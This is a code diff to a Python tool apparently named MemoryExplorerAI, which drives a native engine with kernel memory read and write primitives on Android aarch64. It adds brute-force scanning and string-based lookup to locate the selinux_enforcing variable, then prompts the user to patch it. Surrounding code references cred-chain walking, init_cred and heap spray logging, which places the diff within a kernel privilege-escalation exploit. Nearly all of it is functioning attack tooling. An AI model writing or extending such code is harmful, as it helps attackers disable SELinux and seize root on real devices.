@@ -764,6 +764,61 @@ class MemoryExplorerAI:
             return self.read_page(va) or b""
         return triple
 
+    def selsearch(self, start_va, end_va, step=0x1000):
+        """Brute-force scan a kernel data range for the selinux_enforcing
+        page. The C engine reads 3 times at each candidate, accepts only
+        stable 0/1/2/3 values with non-zero surrounding data and (ideally)
+        a kernel pointer. Returns a list of (va, val, nz, ptr) hits or [].
+        Up to 16 hits per call."""
+        if not self._engine_write(
+                f"selsearch {hex(start_va)} {hex(end_va)} {hex(step)}\n".encode()):
+            return []
+        hits = []
+        while True:
+            line = self._readline_timeout(timeout=10.0)
+            if line is None or not line:
+                break
+            if line.startswith("SELSEARCH:HIT:"):
+                try:
+                    parts = line.split(":")
+                    va = int(parts[2], 16)
+                    val = int(parts[3])
+                    nz = int(parts[4].split("=")[1])
+                    ptr = int(parts[5].split("=")[1])
+                    hits.append((va, val, nz, ptr))
+                except Exception:
+                    pass
+            elif line.startswith("SELSEARCH:DONE:"):
+                break
+            elif line.startswith("BAD_ARGS"):
+                break
+        return hits
+
+    def symlook(self, kbase, end_va, name):
+        """Search the kernel .rodata / .text for `name` (e.g.
+        'selinux_enforcing'). Returns the VA where the string is first
+        found, or None. C engine scans in 64KB chunks."""
+        if not self._engine_write(
+                f"symlook {hex(kbase)} {hex(end_va)} {name}\n".encode()):
+            return None
+        deadline = time.time() + 60
+        while time.time() < deadline:
+            line = self._readline_timeout(timeout=5.0)
+            if line is None:
+                return None
+            if not line:
+                continue
+            if line.startswith("SYMLOOK:FOUND:"):
+                try:
+                    return int(line.split(":", 2)[2], 16)
+                except Exception:
+                    return None
+            if line.startswith("SYMLOOK:NOTFOUND"):
+                return None
+            if line.startswith("BAD_ARGS"):
+                return None
+        return None
+
     def patch_mem(self, va, val):
         if not self._engine_write(f"patch {hex(va)} {hex(val)}\n".encode()):
             return "Engine Error"
@@ -826,9 +881,13 @@ class MemoryExplorerAI:
         return None
 
     def _probe_selinux(self, kbase):
-        """Strict SELinux enforcing probe: try ALL known offsets, score each by
-        non-zero data, pick the one with most non-zero bytes (real kernel page).
-        Returns (va, val) or None."""
+        """Strict SELinux enforcing probe. Three-step strategy:
+        1. Try all known offsets (15 candidates from v6.c + extras)
+        2. If none hit, brute-force scan the kernel .data section with selsearch
+        3. As a last resort, search for the 'selinux_enforcing' string in
+           kernel rodata and inspect neighbouring pages.
+        Returns (va, val) on success or None."""
+        # Step 1: try all known offsets
         best = None  # (score, va, val, nz, ptr)
         for off in self.selinux_offset_candidates:
             va = kbase + off
@@ -837,14 +896,12 @@ class MemoryExplorerAI:
             line = self._wait_for_engine_reply("SELINUX:", timeout=5.0)
             if not line:
                 continue
-            # Parse: SELINUX:OK:<va>:<val>:stable:nz=<n>:ptr=<p>
             if "SELINUX:OK:" in line:
                 try:
                     parts = line.split(":")
                     val = int(parts[3])
                     nz = int(parts[5].split("=")[1])
                     ptr = int(parts[6].split("=")[1])
-                    # Score: 100*ptr + nz (prefer pages with kernel pointers)
                     score = 1000 * ptr + nz
                     if best is None or score > best[0]:
                         best = (score, va, val, nz, ptr)
@@ -856,17 +913,97 @@ class MemoryExplorerAI:
                     val = int(parts[3])
                     nz = int(parts[5].split("=")[1])
                     ptr = int(parts[6].split("=")[1])
-                    # Weak: lower priority than OK
-                    score = 500 * ptr + nz - 100  # penalty
+                    score = 500 * ptr + nz - 100
                     if best is None or score > best[0]:
                         best = (score, va, val, nz, ptr)
                 except Exception:
                     pass
-            # ZERO_PAGE / UNSTABLE / FAIL: skip
-        if best is None:
-            return None
-        _, va, val, nz, ptr = best
-        return (va, val)
+        if best is not None:
+            _, va, val, nz, ptr = best
+            self.live["last_msg"] = (
+                f"SELinux @ {hex(va)} val={val} nz={nz} ptr={ptr} (known offset)")
+            return (va, val)
+
+        # Step 2: brute-force scan around the most likely offset first,
+        # then expand outward.
+        # selinux_enforcing is usually at kbase + ~0x2caa000 on Android 13
+        # / kernel 5.4 aarch64, so we start close and fan out.
+        self.live["last_msg"] = "SELinux not at known offsets — brute-force scan…"
+        focused_center = self.selinux_offset_candidates[len(self.selinux_offset_candidates) // 2]
+        all_hits = []
+        # Focused scan: ±0x10000 around the median candidate offset
+        focused_hits = self.selsearch(
+            kbase + focused_center - 0x10000,
+            kbase + focused_center + 0x10000,
+            0x100)
+        all_hits.extend(focused_hits)
+        # If focused didn't find anything, expand: ±0x200000 around each candidate
+        if not all_hits:
+            for off in self.selinux_offset_candidates[:5]:
+                hits = self.selsearch(kbase + off - 0x200000, kbase + off + 0x200000, 0x1000)
+                all_hits.extend(hits)
+                if all_hits:
+                    break
+        # Last resort: scan the full kernel .data section (16..64MB)
+        if not all_hits:
+            hits = self.selsearch(kbase + 0x1000000, kbase + 0x4000000, 0x1000)
+            all_hits.extend(hits)
+        if all_hits:
+            # Deduplicate by VA
+            seen = set()
+            deduped = []
+            for h in all_hits:
+                if h[0] not in seen:
+                    seen.add(h[0])
+                    deduped.append(h)
+            # Score hits: prefer val==1 (enforcing), then val==0, then others
+            def score(h):
+                _, val, nz, ptr = h
+                val_score = 100 if val == 1 else (50 if val == 0 else 0)
+                return val_score * 10000 + ptr * 1000 + nz
+            deduped.sort(key=score, reverse=True)
+            va, val, nz, ptr = deduped[0]
+            self.live["last_msg"] = (
+                f"SELinux @ {hex(va)} val={val} (brute-force hit, nz={nz} ptr={ptr}, "
+                f"{len(deduped)} candidates)")
+            return (va, val)
+
+        # Step 3: search for "selinux_enforcing" string in kernel rodata
+        self.live["last_msg"] = "SELinux brute-force failed — searching for 'selinux_enforcing'…"
+        # Search the first 64MB of kernel image (text + rodata)
+        str_va = self.symlook(kbase, kbase + 0x4000000, "selinux_enforcing")
+        if str_va:
+            # The string VA is in .rodata, but the actual variable is in .data
+            # Scan a small range around the string VA
+            hits = self.selsearch(str_va, str_va + 0x100000, 0x1000)
+            if hits:
+                def score(h):
+                    _, val, nz, ptr = h
+                    val_score = 100 if val == 1 else (50 if val == 0 else 0)
+                    return val_score * 10000 + ptr * 1000 + nz
+                hits.sort(key=score, reverse=True)
+                va, val, nz, ptr = hits[0]
+                self.live["last_msg"] = (
+                    f"SELinux @ {hex(va)} val={val} (found via string '{str_va:#x}')")
+                return (va, val)
+            # Even if selsearch failed, the variable might be near the
+            # string. Try common offsets from the string VA.
+            for off in (0, 0x1000, 0x2000, 0x4000, -0x1000, -0x2000, -0x4000,
+                        0x10000, 0x100000, 0x200000, 0x1000000):
+                va = str_va + off
+                if not self._engine_write(f"selinux {hex(va)}\n".encode()):
+                    continue
+                line = self._wait_for_engine_reply("SELINUX:", timeout=5.0)
+                if not line or "SELINUX:OK" not in line:
+                    continue
+                try:
+                    parts = line.split(":")
+                    val = int(parts[3])
+                    return (va, val)
+                except Exception:
+                    pass
+        self.live["last_msg"] = "SELinux NOT found (known offsets + brute-force + string search all failed)"
+        return None
 
     def _wait_for_engine_reply(self, prefix, timeout=2.0):
         """Read engine stdout until a line starts with `prefix` (or timeout)."""
@@ -2268,6 +2405,68 @@ class MemoryExplorerAI:
                         self.live["last_msg"] = f"Invalid idx: {parts[1]}"
                 else:
                     self.live["last_msg"] = "Usage: walk <id> [off_in_page=0x770]"
+            elif cmd in ("selsearch",) or cmd.startswith("selsearch "):
+                # Manual brute-force SELinux search
+                # Usage: selsearch [start_hex] [end_hex] [step_hex]
+                if not self.kernel_base:
+                    self.live["last_msg"] = "Need kernel_base first — press E"
+                    continue
+                parts = cmd.split()
+                start = self.kernel_base + 0x1000000
+                end   = self.kernel_base + 0x4000000
+                step  = 0x1000
+                if len(parts) >= 2:
+                    try: start = int(parts[1], 16)
+                    except: pass
+                if len(parts) >= 3:
+                    try: end = int(parts[2], 16)
+                    except: pass
+                if len(parts) >= 4:
+                    try: step = int(parts[3], 16)
+                    except: pass
+                self.live["last_msg"] = (f"selsearch {hex(start)} .. {hex(end)} "
+                                          f"step={hex(step)}…")
+                hits = self.selsearch(start, end, step)
+                # Add all hits to found_items so the user can review them
+                for h in hits:
+                    h_va, h_val, h_nz, h_ptr = h
+                    self._add_found(
+                        va=hex(h_va),
+                        type="SELinux Candidate",
+                        desc=f"val={h_val} (nz={h_nz} ptr={h_ptr}, brute-force)",
+                        confidence=70 if h_val == 1 else 50,
+                    )
+                if hits:
+                    h_va, h_val, h_nz, h_ptr = hits[0]
+                    self.selinux_va = h_va
+                    self.live["last_msg"] = (f"selsearch: {len(hits)} hits. "
+                                              f"Best: {hex(h_va)} val={h_val} "
+                                              f"(nz={h_nz} ptr={h_ptr}). Patch now?")
+                else:
+                    self.live["last_msg"] = f"selsearch: 0 hits in {hex(start)}..{hex(end)}"
+            elif cmd in ("symlook",) or cmd.startswith("symlook "):
+                # Manual symbol search
+                # Usage: symlook <name>  (searches kbase..kbase+0x4000000)
+                if not self.kernel_base:
+                    self.live["last_msg"] = "Need kernel_base first — press E"
+                    continue
+                parts = cmd.split()
+                if len(parts) < 2:
+                    self.live["last_msg"] = "Usage: symlook <name>  (e.g. symlook selinux_enforcing)"
+                    continue
+                name = parts[1]
+                self.live["last_msg"] = f"symlook '{name}' in kernel rodata…"
+                va = self.symlook(self.kernel_base, self.kernel_base + 0x4000000, name)
+                if va:
+                    self.live["last_msg"] = f"symlook: '{name}' @ {hex(va)}"
+                    self._add_found(
+                        va=hex(va),
+                        type="Kernel Symbol",
+                        desc=f"String '{name}' found in kernel rodata",
+                        confidence=95,
+                    )
+                else:
+                    self.live["last_msg"] = f"symlook: '{name}' NOT found"
             elif cmd in ("help", "?", "h"):
                 # Show full help
                 sys.stdout.write(C.CLR)
@@ -2285,6 +2484,8 @@ class MemoryExplorerAI:
                     ("<id>",               "Open detail view of found item #id"),
                     ("v<id>",              "Re-verify found item #id (re-read VA)"),
                     ("walk <id> [off]",    "Walk cred chain from item #id @ offset (default 0x770)"),
+                    ("selsearch [s e stp]","Brute-force scan for SELinux enforcing in kernel data"),
+                    ("symlook <name>",     "Search kernel rodata for a string symbol"),
                     ("list / ls / items",  "Paginated dump of ALL found items"),
                     ("kb / kbase",         "Show kernel base / SELinux / init_cred status"),
                     ("log / logs",         "Show recent spray log (JSONL)"),
